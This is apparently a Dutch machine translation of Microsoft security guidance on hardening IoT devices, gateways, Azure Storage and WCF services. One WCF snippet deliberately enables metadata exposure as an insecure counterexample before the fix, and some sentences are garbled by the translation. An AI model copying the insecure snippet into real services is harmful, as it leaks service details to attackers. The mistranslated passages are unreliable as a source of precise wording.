## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Ervoor zorgen dat alle beheerinterfaces zijn beveiligd met sterke referenties

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | IoT-apparaat | 
| **SDL-fase**               | Implementatie |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | Alle administratieve interfaces die het apparaat of de veldgateway blootlegt, moeten worden beveiligd met behulp van sterke referenties. Ook alle andere blootgestelde interfaces zoals WiFi, SSH, Bestandsshares, FTP moeten worden beveiligd met sterke referenties. Standaard zwakke wachtwoorden mogen niet worden gebruikt. |

## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Ervoor zorgen dat onbekende code niet kan worden uitgevoerd op apparaten

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | IoT-apparaat | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Beveiliging opstarten en apparaatversleuteling in de bitlocker inschakelen op Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Stappen** | UEFI Secure Boot beperkt het systeem om alleen de uitvoering van binaire bestanden toe te staan die door een bepaalde autoriteit zijn ondertekend. Deze functie voorkomt dat onbekende code wordt uitgevoerd op het platform en mogelijk de beveiligingshouding ervan verzwakt. Schakel UEFI Secure Boot in en beperk de lijst met certificaatautoriteiten die vertrouwd zijn voor het ondertekenen van code. Teken alle code die op het apparaat wordt geïmplementeerd met een van de vertrouwde autoriteiten. |

## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Besturingssysteem en extra partities van IoT-apparaat versleutelen met bit-locker

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | IoT-apparaat | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | Windows 10 IoT Core implementeert een lichtgewicht versie van bit-locker Device Encryption, die een sterke afhankelijkheid heeft van de aanwezigheid van een TPM op het platform, inclusief het benodigde preOS-protocol in UEFI dat de nodige metingen uitvoert. Deze preOS metingen zorgen ervoor dat het OS later een definitief verslag heeft van hoe het OS werd gelanceerd. Versleutel OS-partities met behulp van bit-locker en eventuele extra partities ook in het geval ze gevoelige gegevens op te slaan. |

## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Ervoor zorgen dat alleen de minimale services/functies zijn ingeschakeld op apparaten

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | IoT-apparaat | 
| **SDL-fase**               | Implementatie |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | Schakel geen functies of services in het besturingssysteem in of uit die niet vereist zijn voor het functioneren van de oplossing. Als het apparaat bijvoorbeeld geen gebruikersinterface vereist om te worden geïmplementeerd, installeert u Windows IoT Core in de headless-modus. |

## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Besturingssysteem en extra partities van IoT Field Gateway versleutelen met bit-locker

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | IoT-veldgateway | 
| **SDL-fase**               | Implementatie |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | Windows 10 IoT Core implementeert een lichtgewicht versie van bit-locker Device Encryption, die een sterke afhankelijkheid heeft van de aanwezigheid van een TPM op het platform, inclusief het benodigde preOS-protocol in UEFI dat de nodige metingen uitvoert. Deze preOS metingen zorgen ervoor dat het OS later een definitief verslag heeft van hoe het OS werd gelanceerd. Versleutel OS-partities met behulp van bit-locker en eventuele extra partities ook in het geval ze gevoelige gegevens op te slaan. |

## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Ervoor zorgen dat de standaardinloggegevens van de veldgateway tijdens de installatie worden gewijzigd

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | IoT-veldgateway | 
| **SDL-fase**               | Implementatie |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | Ervoor zorgen dat de standaardinloggegevens van de veldgateway tijdens de installatie worden gewijzigd |

## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Zorg ervoor dat de Cloud Gateway een proces implementeert om de firmware van verbonden apparaten up-to-date te houden

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | IoT Cloud Gateway | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | Keuze voor gateway - Azure IoT Hub |
| **Verwijzingen**              | [Overzicht van IoT Hub-apparaatbeheer](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [apparaatfirmware bijwerken](../../iot-hub/tutorial-firmware-update.md) |
| **Stappen** | LWM2M is een protocol van de Open Mobile Alliance for IoT Device Management. Azure IoT-apparaatbeheer maakt het mogelijk om te communiceren met fysieke apparaten met apparaattaken. Zorg ervoor dat de Cloud Gateway een proces implementeert om het apparaat en andere configuratiegegevens routinematig up-to-date te houden met Azure IoT Hub Device Management. |

## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Ervoor zorgen dat apparaten eindpuntbeveiligingsbesturingselementen hebben geconfigureerd volgens organisatiebeleid

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Grens van machinevertrouwensrelatie | 
| **SDL-fase**               | Implementatie |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | Zorg ervoor dat apparaten end-point beveiligingsbesturingselementen hebben, zoals bit-locker voor versleuteling op schijfniveau, anti-virus met bijgewerkte handtekeningen, hostgebaseerde firewall, OS-upgrades, groepsbeleid enz. |

## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Zorgen voor veilig beheer van Azure-opslagtoegangssleutels

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Azure Storage | 
| **SDL-fase**               | Implementatie |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Beveiligingshandleiding voor Azure Storage - Uw opslagaccountsleutels beheren](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Stappen** | <p>Sleutelopslag: Het wordt aanbevolen om de azure-opslagtoegangssleutels in Azure Key Vault als geheim op te slaan en de toepassingen de sleutel uit de sleutelkluis te laten ophalen. Dit wordt aanbevolen om de volgende redenen:</p><ul><li>De toepassing zal nooit de opslagsleutel hardcoded in een configuratiebestand, die die laan van iemand die toegang tot de sleutels zonder specifieke toestemming verwijdert</li><li>Toegang tot de sleutels kan worden beheerd met Azure Active Directory. Dit betekent dat een accounteigenaar toegang kan verlenen tot het handvol toepassingen dat de sleutels uit Azure Key Vault moet ophalen. Andere toepassingen hebben geen toegang tot de sleutels zonder hen specifiek toestemming te verlenen</li><li>Sleutelregeneratie: Het wordt aanbevolen om een proces te hebben om Azure-opslagtoegangssleutels om veiligheidsredenen te regenereren. Details over waarom en hoe u plannen voor belangrijke regeneratie zijn gedocumenteerd in het naslagartikel azure storage security guide</li></ul>|

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Ervoor zorgen dat alleen vertrouwde oorsprong is toegestaan als CORS is ingeschakeld op Azure-opslag

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Azure Storage | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [CORS-ondersteuning voor Azure Storage Services](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Stappen** | Met Azure Storage u CORS – Cross Origin Resource Sharing inschakelen. Voor elk opslagaccount u domeinen opgeven die toegang hebben tot de bronnen in dat opslagaccount. CorS is standaard uitgeschakeld op alle services. U CORS inschakelen door de REST API of de opslagclientbibliotheek te gebruiken om een van de methoden aan te roepen om het servicebeleid in te stellen. |

## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>De functie servicebeperking van WCF inschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | WCF | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | .NET Framework 3 |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com) |
| **Stappen** | <p>Het niet plaatsen van een limiet op het gebruik van systeembronnen kan leiden tot uitputting van de middelen en uiteindelijk een denial of service.</p><ul><li>**UITLEG:** Windows Communication Foundation (WCF) biedt de mogelijkheid om serviceverzoeken te beperken. Het toestaan van te veel clientaanvragen kan een systeem overspoelen en de resources uitputten. Aan de andere kant kan het toestaan van slechts een klein aantal aanvragen voor een service legitieme gebruikers verhinderen de service te gebruiken. Elke service moet individueel worden afgestemd en geconfigureerd om de juiste hoeveelheid resources mogelijk te maken.</li><li>**AANBEVELINGEN** Schakel de servicebeperkingsfunctie van WCF in en stel limieten in die geschikt zijn voor uw toepassing.</li></ul>|

### <a name="example"></a>Voorbeeld
Het volgende is een voorbeeldconfiguratie met beperking ingeschakeld:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>WCF-Informatie openbaarmaking door middel van metadata

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | WCF | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | .NET Framework 3 |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com) |
| **Stappen** | Metagegevens kunnen aanvallers helpen meer te weten te komen over het systeem en een vorm van aanval te plannen. WCF-services kunnen worden geconfigureerd om metagegevens bloot te leggen. Metagegevens geven gedetailleerde informatie over de servicebeschrijving en mogen niet worden uitgezonden in productieomgevingen. `HttpGetEnabled`  /  De `HttpsGetEnabled` eigenschappen van de klasse ServiceMetaData bepalen of een service de metagegevens blootlegt | 

### <a name="example"></a>Voorbeeld
De onderstaande code instrueert WCF om de metadata van een dienst uit te zenden
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Zend geen metagegevens van de service uit in een productieomgeving. Stel de eigenschappen httpGetEnabled / HttpsGetEnabled van de klasse ServiceMetaData in op false. 

### <a name="example"></a>Voorbeeld
De onderstaande code instrueert WCF om de metadata van een dienst niet uit te zenden. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
